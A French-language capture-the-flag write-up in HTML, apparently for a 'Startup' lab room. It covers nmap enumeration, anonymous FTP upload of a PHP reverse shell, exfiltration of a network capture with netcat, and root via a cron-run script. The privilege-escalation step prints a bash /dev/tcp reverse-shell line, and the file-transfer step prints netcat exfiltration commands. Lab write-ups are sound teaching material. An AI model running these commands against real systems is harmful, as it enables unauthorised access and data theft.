@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<html>
+<div class="header">
+
+    <nav class="navbar navbar-inverse">
+        <div class="container-fluid">
+            <div class="navbar-header">
+                <a class='navbar-brand' href="index.html">Mr.NOODLE blog</a>
+            </div>
+            <ul class="nav navbar-nav">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="about.html">À propos</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+
+        </div>
+    
+    </nav>
+<h1>
+  WU:Startup
+</h1>
+</div>
+
+<head>
+    <title>Mr.NOODLE's blog</title>
+</head>    
+<body>
+    <style>
+      code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}       
+        .article-list{
+  margin-top: 10vh;
+  width: 60%;
+  margin-left: 20%;
+  background: #000019;
+  padding: 5% 10% 1% 10%;
+  border-radius: 1vw;
+  box-shadow: 7px 10px 20px 1px rgba(0,0,0,0.58);
+  padding-bottom: -15vh;
+  margin-bottom: 15vh;
+  overflow: hidden;
+}
+h2{
+    color: white;
+}
+p {
+    color: white;
+    font-size: 1.5em;
+}
+.article{
+  margin-bottom: 10vh;
+  margin-top: 5vh;
+  padding-top: 4vh;
+  display: inline-block;
+  border-top: 1px solid #333;
+}
+
+.first_article{
+  margin-top: -5vh;
+  border-top: none;
+
+}
+.article h2{
+  margin-top: 3vw;
+  margin-bottom: 1vw;
+}
+footer {
+    display: flex;
+    justify-content: center;
+}
+
+.header::before{
+  content: "";
+  position: absolute;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 40vh;
+  background-image: url("img/background.gif");
+  background-size: cover;
+  background-position: center;
+  filter: brightness(50%);
+  z-index: -1;
+}
+
+.header h1{
+  color: white;
+  text-align: center;
+  padding-top: 6%;
+  font-size: 3vw;
+}
+h1{
+  color: white;
+}
+li{
+  color: white;
+}
+body{
+  background: #070707;
+    background-color: rgb(7, 7, 7);
+    background-position-x: 0%;
+    background-position-y: 0%;
+    background-repeat: repeat;
+    background-attachment: scroll;
+    background-image: none;
+    background-size: auto;
+    background-origin: padding-box;
+    background-clip: border-box;
+overflow-x: hidden;
+}
+code{
+  background: black;
+}
+ .article img{
+     max-width:100%;
+     max-height:100%;
+     display: block;
+}
+</style> 
+<section class="article-list">
+  <p>Comme d'habitude commençons par:</p>
+  <h1> 1) Énumération </h1>
+  <img src="img/article2/nmap.png" width="500", height="300">
+  <p>Comme vous pouvez voir nous avons 3 ports ouverts sur cette machine. le port par défaut du FTP (port 21), le port par défaut du service ssh (le port 22 pour celui là) et le port 80 qui signifie que un site web tourne cette machine. Maintenant checkons ce que nous offre ses ports </p>
+  <h2>Le port 21</h2>
+  <p>Comme nous pouvions remarquer sur le scan nmap ci-dessus nous pouvons nous connecter en anonymous au ftp et en plus que nous pouvons écrire dans le dossier <strong>ftp</strong> gardons ça au fin fond de notre mémoire. alors en se connectant, nous avons plusieurs fichiers, après vérification ses fichiers nous donnent rien d'intérrésant pour le moment (à part le dossier ftp avec les droits d'écriture bien évidemment on oublie pas ce détail) passons alors au site web</p>
+  <h2>Le port 80</h2>
+  <img src="img/article2/site.png" width="500", height="300">
+  <p>Bon c'est pas pour juger vos talents d'observateur mais vous pouvez remarquer que le site est un peu vide peut-être que il y a un dossier qui peut être intérrésant utilisant donc notre outil préféré pour le fuzzing de directory aka ffuf</p>
+  <img src="img/article2/fuzz.png" width="500" height="300">
+  <p><strong>files/</strong> mon instinct me dis que c'est pas par défaut ça checkons ça</p>
+ <img src="img/article2/exploit1.png" width="500", height="300">
+<br></br>
+<img src="img/article2/deja_vu.gif">
+<p>Dossier FTP avec un fichier appelé notice.txt cela me rappelle le ftp mais attendez sachant que on a les droits d'écriture dans le dossier ftp/ je dois check un truc je reviens</p>
+<img src="img/article2/test.png" width="500", height="300">
+<p>j'ai foutu mon fichier de scan nmap dans le dossier FTP pour voir si il apparaît dans le dossier ftp sur le site web et résultat comme vous pouvez voir c'est aussi upload sur le site. Cela me donne une idée maléfique </p>
+<h1> 2) Exploitation </h1>
+<p>Mon idée maléfique consiste à mettre un reverse-shell en php présent <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> Ici</a>
+dans le dossier FTP afin qu'on puisse le lancer sur le site web </p>
+<img src="img/article2/shell.png" width="500", height="300">
+<p>Mes mots me manquent pour dire que j'ai une joie intérieure explosive en voyant ça, alors checkons les moyens de privesc car c'est bon d'avoir un shell mais avoir un user et avoir aussi un shell root c'est cool parfois</p>
+<h1>3) Privesc</h1>
+<p>après avoir executé <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas</a> nous avons pu remarquer 2 chose qui devrait pas dans le dossier racine <code>/</code> de type un fichier <strong>recipe.txt</strong> et un dossier nommé <strong>incidents</strong>
+(le fichier recipe.txt est le fichier pour répondre à la premiere question de la room) mais dans le dossier incidents nous avons une capture réseau 
+</p>
+<img src="img/article2/fichier1.png" width="500", height="300">
+<p>Mais cela est un peu compliqué car nous sommes pas en ssh donc pas de scp alors je vous donnes un petit tips pour résoudre ce problème</p>
+</br>
+<p>Alors pour cela il nous faut</p>
+<ul>
+  <li>Un netcat tout droit sortie du terroir</li>
+</ul>
+<p>ce que vous devez faire c'est</p>
+<h2>Sur votre machine:</h2>
+<code>nc -lvp "votre port que vous voulez ouvrir" > "votre fichier de sortie> </code>
+<h2>Sur la machine victime:</h2>
+<code>nc "votre ip" "votre port ouvert" < "le fichier que vous voulez télécharger"</code> 
+<p>comme ceci</p>
+<img src="img/article2/récup.png" width="500", height="300">
+<p><strong>Bingo</strong> maintenant analysons la capture réseau qu'on a fraîchement installer.</p>
+<p>Bon alors mon instinct me dit que en analysant les requêtes http ceci est une capture réseau établie lors d'une attaque similaire à la nôtre donc pour voir ce que la personne a tapé dans son shell pour ça nous devons voir les datas des requetes TCP pour ça vous devez clique droit sur un packet TCP suivant la requete HTTP-GET et vous cliquez sur Follow -> TCP stream</p>
+<img src="img/article2/wireshark.png" width="500", height="300">
+<p>D'après mon intuition de détective hors-pair la personne a essayé d'accéder au dossier d'un user nommé lennie mais malheureusement il a pas les droits pour ça alors il essaye de voir quel droit il peut executer avec sudo mais sans succès. Mais attendez, il a essayé d'utiliser comme mot de passe <code>[sudo] password for www-data: <strong>CENSURED</strong></code></p>
+<p>Nous avons le nom d'un user et nous avons un mot de passe donc au fourneau</p>
+<img src="img/article2/lennie.png" width="500", height="300">
+<p>Nous nous sommes connectés en tant que lennie par ssh maintenant checkons ce qu'il pourrait être intérrésant</p>
+<img src="img/article2/scripts.png" width="500", height="300">
+<p>Nous avons un dossier nommé <code>scripts/</code>. Allons dans ce dossier de pied ferme</p>
+<img src="img/article2/cron.png" width="500", height="300">
+<p>je suspectes un cron qui éxecute ce script mais malheureusement nous n'avons pas les droits d'écriture sur ce fichier</p>
+<p>Mais attendez il y a un autre script éxecuté depuis ce script appelé print.sh se trouvant dans le dossier <code>/etc/</code> et bingo nous avons les droits d'écriture sur ce fichier là. Remplaçons le code contenue dans ce fichier par <code>bash -i >& /dev/tcp/"IP"/"PORT" 0>&1</code></p>
+<p>Et maintenant attendont si mon hypothèse fonctionne </p>
+<img src="img/article2/privesc.png" width="500", height="300">
+<p><strong>ET LET'S GO NOUS SOMMES ROOT POUR FÊTER ÇA PIZZA</strong>
+<p>Bon sérieusement merci les gens d'avoir lu mon article et n'hésitez pas à me donner quelque feedback</p>
+</section>
+</body>
